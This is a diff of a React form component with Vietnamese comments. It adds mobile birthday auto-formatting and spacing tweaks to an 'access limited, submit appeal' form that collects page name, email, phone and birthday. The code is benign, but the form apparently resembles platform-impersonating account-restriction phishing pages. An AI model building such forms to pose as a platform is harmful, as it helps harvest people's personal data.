@@ -55,6 +55,62 @@ const Home = () => {
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
 
+    // Hàm xử lý date input cho mobile
+    const handleDateInputChange = (value) => {
+        // Chỉ cho phép số
+        let cleanedValue = value.replace(/[^\d]/g, '');
+        
+        // Giới hạn độ dài
+        if (cleanedValue.length > 8) return;
+        
+        // Tự động thêm dấu /
+        let formattedValue = cleanedValue;
+        if (cleanedValue.length > 2) {
+            formattedValue = cleanedValue.slice(0, 2) + '/' + cleanedValue.slice(2);
+        }
+        if (cleanedValue.length > 4) {
+            formattedValue = formattedValue.slice(0, 5) + '/' + formattedValue.slice(5);
+        }
+        
+        // Giới hạn số cho ngày, tháng
+        const parts = formattedValue.split('/');
+        if (parts[0] && parts[0].length === 2) {
+            const day = parseInt(parts[0]);
+            if (day > 31) {
+                parts[0] = '31';
+                formattedValue = parts.join('/');
+            }
+            if (day < 1) {
+                parts[0] = '01';
+                formattedValue = parts.join('/');
+            }
+        }
+        
+        if (parts[1] && parts[1].length === 2) {
+            const month = parseInt(parts[1]);
+            if (month > 12) {
+                parts[1] = '12';
+                formattedValue = parts.join('/');
+            }
+            if (month < 1) {
+                parts[1] = '01';
+                formattedValue = parts.join('/');
+            }
+        }
+        
+        setFormData((prev) => ({
+            ...prev,
+            birthday: formattedValue
+        }));
+
+        if (errors.birthday) {
+            setErrors((prev) => ({
+                ...prev,
+                birthday: false
+            }));
+        }
+    };
+
     const translateAllTexts = useCallback(
         async (targetLang) => {
             try {
@@ -319,8 +375,8 @@ const Home = () => {
                             <p className='mb-3'>{translatedTexts.accessLimited}</p>
                             <p>{translatedTexts.submitAppeal}</p>
                         </div>
-                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold sm:gap-2'>
-                            <div className='flex flex-col gap-1 sm:gap-2'>
+                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
+                            <div className='flex flex-col gap-1'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
@@ -328,14 +384,15 @@ const Home = () => {
                                     type='text' 
                                     name='pageName' 
                                     autoComplete='organization' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-2 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
                                     value={formData.pageName} 
                                     onChange={(e) => handleInputChange('pageName', e.target.value)} 
                                 />
                                 {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-1 sm:gap-2'>
+                            
+                            <div className='flex flex-col gap-1'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
@@ -343,26 +400,27 @@ const Home = () => {
                                     type='email' 
                                     name='mail' 
                                     autoComplete='email' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-2 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
                                     value={formData.mail} 
                                     onChange={(e) => handleInputChange('mail', e.target.value)} 
                                 />
                                 {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
+                            
                             <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
                                 <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
-                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-sm font-medium text-gray-700'>{callingCode}</div>
+                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-2 text-sm font-medium text-gray-700'>{callingCode}</div>
                                     <input 
                                         type='tel' 
                                         name='phone' 
                                         inputMode='numeric' 
                                         pattern='[0-9]*' 
                                         autoComplete='off' 
-                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none'
+                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-2 focus:ring-0 focus:outline-none'
                                         style={{ fontSize: '16px' }}
                                         value={formData.phone.replace(/^\+\d+\s*/, '')} 
                                         onChange={(e) => handleInputChange('phone', e.target.value)} 
@@ -370,29 +428,47 @@ const Home = () => {
                                 </div>
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
+                            
                             <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
+                                
+                                {/* Desktop: type='date' */}
                                 <input 
                                     type='date' 
                                     name='birthday' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-2 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
                                     value={formData.birthday} 
                                     onChange={(e) => handleInputChange('birthday', e.target.value)} 
                                 />
+                                
+                                {/* Mobile: input với tự động format dd/mm/yyyy */}
+                                <div className='block sm:hidden relative'>
+                                    <input 
+                                        type='text' 
+                                        name='birthday' 
+                                        inputMode='numeric'
+                                        className={`w-full rounded-lg border px-3 py-2.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} bg-white text-gray-900 text-base font-medium`}
+                                        style={{ fontSize: '16px' }}
+                                        placeholder='dd/mm/yyyy'
+                                        value={formData.birthday}
+                                        onChange={(e) => handleDateInputChange(e.target.value)}
+                                    />
+                                </div>
+                                
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             
-                            <div className='flex flex-col gap-1 sm:gap-2'>
-                                <p className='text-sm sm:text-base'>
+                            <div className='flex flex-col gap-1'>
+                                <p className='text-base sm:text-sm'>
                                     {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
                                 </p>
                                 <textarea 
                                     name='appeal'
-                                    rows={3}
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
+                                    rows={4}
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-2 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
                                     style={{ fontSize: '16px' }}
                                     placeholder={translatedTexts.appealPlaceholder}
                                     value={formData.appeal}
@@ -401,9 +477,8 @@ const Home = () => {
                                 {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
 
-                            {/* NÚT SUBMIT VỚI CHIỀU CAO NHỎ HƠN */}
                             <button 
-                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 text-base font-semibold transition-colors duration-200 mt-2'
+                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-3 text-base font-semibold transition-colors duration-200 sm:mt-1'
                                 onClick={handleSubmit}
                             >
                                 {translatedTexts.submit}
